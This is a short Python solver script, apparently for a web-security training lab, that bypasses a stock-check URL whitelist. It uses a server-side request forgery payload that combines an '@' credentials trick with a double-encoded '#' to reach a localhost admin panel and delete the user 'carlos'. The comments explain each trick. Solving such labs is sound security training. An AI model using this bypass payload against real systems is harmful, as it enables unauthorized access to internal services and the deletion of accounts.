import sys
import os
sys.path.insert(0, os.path.join(os.path.dirname(__file__), "../.."))
from utils.base import LabSession

lab = LabSession()

# server whitelists stock.weliketoshop.net in the stockApi URL
# bypass with three combined tricks:
#   @ makes the parser treat what's before it as credentials
#   %2523 double-encodes # (%25 = %, so %2523 -> %23 -> #)
#   after decoding, # turns the whitelisted domain into a URL fragment
# result: request goes to localhost, whitelist sees the allowed domain in the fragment

lab.info("Bypassing whitelist filter...")
resp = lab.post("/product/stock", data={
    "stockApi": "http://localhost:80%2523@stock.weliketoshop.net/admin"
})

if resp.status_code == 200 and "carlos" in resp.text:
    lab.success("Got admin panel, deleting carlos...")
    lab.post("/product/stock", data={
        "stockApi": "http://localhost:80%2523@stock.weliketoshop.net/admin/delete?username=carlos"
    })
else:
    lab.fail(f"Bypass failed (status {resp.status_code})")

lab.check_solved()
